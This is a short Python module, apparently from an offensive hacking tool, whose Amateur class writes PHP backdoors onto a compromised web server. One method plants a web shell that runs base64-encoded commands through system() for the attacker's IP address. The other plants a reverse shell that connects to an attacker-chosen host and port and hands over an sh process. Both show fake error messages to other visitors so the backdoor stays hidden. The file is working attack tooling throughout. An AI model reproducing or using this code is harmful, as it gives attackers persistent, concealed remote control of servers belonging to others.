from ..Shells import Shells

class Amateur(Shells):
    def amateur_web(self):
        filename = self.create_shellname("Lists/amateur.txt", 2)

        web = """echo '<?php $up = HEYBEAR; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["c"])){ echo "<pre>"; $c = ($_REQUEST["c"]); $cmd = base64_decode($c); system($cmd); echo "</pre>"; die; }}else{echo "Error: No GraphQL instance found.";};?>' > """

        web += filename
        filename = "/" + filename
        
        web_mod = web.replace("HEYBEAR", self.loginSession.atkerLong)

        Shells.send_shell(self, web_mod, filename, "amateur", "c", "webshells")

    def amateur_rev(self):
        filename = self.create_shellname("Lists/amateur.txt", 2)

        rev = """echo '<?php $up = HEYBEAR; $user = ip2long($_SERVER["REMOTE_ADDR"]); if($up == $user){ if(isset($_REQUEST["host"])){ $h = $_REQUEST["host"]; $decoded = base64_decode($h); $array = explode(" ",$decoded); $i = $array[0]; $p = $array[1]; $sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); }}else{echo "Error: No IPv6 found";}?>' > """
        rev += filename

        filename = "/" + filename

        rev_mod = rev.replace("HEYBEAR", self.loginSession.atkerLong)

        Shells.send_shell(self, rev_mod, filename, "amateur", "host", "revshells")
